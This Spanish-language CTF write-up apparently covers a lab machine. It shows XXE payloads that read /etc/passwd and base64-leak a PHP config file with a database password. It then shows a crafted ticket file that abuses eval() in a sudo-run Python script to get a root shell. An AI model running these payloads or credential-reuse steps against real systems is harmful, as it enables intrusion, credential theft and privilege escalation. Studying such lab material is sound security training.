fase 2

Explotación

XXE — Lectura de archivos del sistema

Una vulnerabilidad XXE ocurre cuando el parser XML del servidor procesa entidades externas sin restricciones, permitiendo leer archivos locales como si fueran parte del documento.

Construimos el payload, lo codificamos en base64 y luego URL-encode, y lo enviamos en el parámetro data:

xml
<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE data [ <!ENTITY file SYSTEM "file:///etc/passwd"> ]> <bugreport> <title>test</title> <cwe>test</cwe> <cvss>test</cvss> <reward>&file;</reward> </bugreport>

La respuesta devuelve el contenido de /etc/passwd:

Burp Suite — respuesta con /etc/passwd

Del /etc/passwd solo nos interesan los usuarios con shell /bin/bash: root y development.

XXE + PHP Filter Wrapper — Lectura de código fuente PHP

Al intentar leer db.php directamente con file:///var/www/html/db.php, no obtenemos nada. Hay dos motivos:

1. Conflicto de sintaxis: el código PHP contiene <?php y ?>, que el parser XML interpreta como etiquetas propias del documento, rompiendo el payload.

2. Ejecución server-side: el servidor ejecuta el PHP antes de devolverlo, ocultando el código fuente.

💡 Solución: php://filter wrapper

Al usar php://filter/read=convert.base64-encode/resource=... obligamos al servidor a codificar el archivo en base64 antes de insertarlo en la entidad XML. El resultado viaja como texto plano que decodificamos localmente.

xml
<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE data [ <!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/db.php"> ]> <bugreport> <title>test</title> <cwe>test</cwe> <cvss>test</cvss> <reward>&file;</reward> </bugreport>

La respuesta devuelve una cadena base64 que al decodificar revela las credenciales de la base de datos:

php
// TODO -> Implement login system with the database. $dbserver = "localhost"; $dbname = "bounty"; $dbusername = "admin"; $dbpassword = "m19RoAU0hP41A1sTsq6K"; $testuser = "test";

Análisis de ticketValidator.py

El script valida archivos .md con un formato específico y usa eval() sobre la línea del código del ticket. El flujo es:

Línea 1Debe empezar con # Skytrain Inc
Línea 2Debe empezar con ## Ticket to
CódigoSección __Ticket Code:__ — línea siguiente es evaluada
Condiciónnúmero % 7 == 4 para continuar
Fallo críticoeval() ejecuta cualquier expresión Python válida
💀 eval() con sudo = root garantizado

eval() ejecuta cualquier código Python que reciba como input. Si controlamos ese input y el script corre como root con sudo, podemos inyectar comandos del sistema.

Python eval() Abuse — shell como root

El número 179 cumple la condición (179 % 7 = 4). Usamos el operador and para encadenar la ejecución de un comando del sistema:

bash
# Creamos el ticket malicioso ❯ cat > /tmp/f.md << 'EOF' # Skytrain Inc ## Ticket to Mars __Ticket Code:__ **179 + 25 == 204 and __import__('os').system('/bin/bash') == True EOF # Ejecutamos como root ❯ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py Please enter the path to the ticket file: /tmp/f.md
Shell como root

Tenemos shell como root. Flag en /root/root.txt.

takeaways

Lecciones aprendidas

01
XXE no requiere un XML visible
Si una aplicación acepta datos en base64 o URL-encoded que al decodificarse resultan XML, sigue siendo vulnerable. Siempre intercepta y decodifica lo que envía el cliente antes de descartar un vector.
02
PHP filter wrappers como bypass estándar
Cuando file:// no funciona para leer PHP via XXE, php://filter/read=convert.base64-encode/resource= resuelve tanto el conflicto de sintaxis XML como la ejecución server-side. Técnica imprescindible en stacks PHP.
03
eval() con sudo es escalada casi garantizada
Cualquier script que use eval() sobre input controlable y pueda ejecutarse como root vía sudo es explotable. El flujo de auditoría correcto: sudo -l → analizar el código del binario permitido → buscar funciones de evaluación dinámica.
04
Reutilización de credenciales en configuraciones
La contraseña de db.php era válida para el usuario development en SSH. En entornos reales este patrón es común: siempre prueba credenciales de archivos de configuración en todos los servicios disponibles.
